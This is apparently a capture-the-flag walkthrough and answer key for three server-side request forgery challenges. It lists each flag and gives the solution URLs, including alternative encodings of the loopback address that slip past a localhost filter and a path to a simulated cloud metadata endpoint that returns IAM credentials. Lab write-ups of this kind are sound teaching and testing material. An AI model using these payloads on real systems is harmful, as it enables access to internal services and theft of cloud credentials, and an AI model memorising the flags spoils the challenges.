# SSRF Walkthroughs

## Challenge 1: Basic SSRF (Easy — 150pts)
**Flag:** `FLAG{ssrf_internal_s3rvice}`

### Solution
```
http://127.0.0.1:9999/internal/flag
```
Enter this in the URL preview field. The server fetches the internal service and displays the flag.

---

## Challenge 2: SSRF Filter Bypass (Medium — 250pts)
**Flag:** `FLAG{ssrf_f1lter_byp4ss}`

### Solution — bypass localhost filter:
```
http://0.0.0.0:9999/internal/flag
http://[::1]:9999/internal/flag
http://0x7f000001:9999/internal/flag
http://2130706433:9999/internal/flag
```
The filter blocks `127.0.0.1` and `localhost` but not alternative representations.

---

## Challenge 3: SSRF to Cloud Metadata (Hard — 300pts)
**Flag:** `FLAG{cl0ud_m3tadata_l3ak}`

### Solution
```
http://127.0.0.1:9999/latest/meta-data/iam/security-credentials/
```
This simulates the AWS metadata service. The response contains IAM credentials including the flag as the SecretAccessKey.
